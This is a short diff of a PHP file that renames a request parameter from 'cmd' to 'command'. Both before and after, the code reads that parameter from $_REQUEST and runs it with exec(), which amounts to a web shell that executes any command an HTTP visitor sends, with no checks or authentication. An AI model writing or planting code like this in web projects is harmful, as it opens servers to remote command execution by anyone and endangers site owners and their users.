@@ -1,6 +1,6 @@
 <?php
-    if(isset($_REQUEST['cmd'])){
-        $command=$_REQUEST['cmd'];
+    if(isset($_REQUEST['command'])){
+        $command=$_REQUEST['command'];
         // execPrint($command);
         exec($command, $result);
     
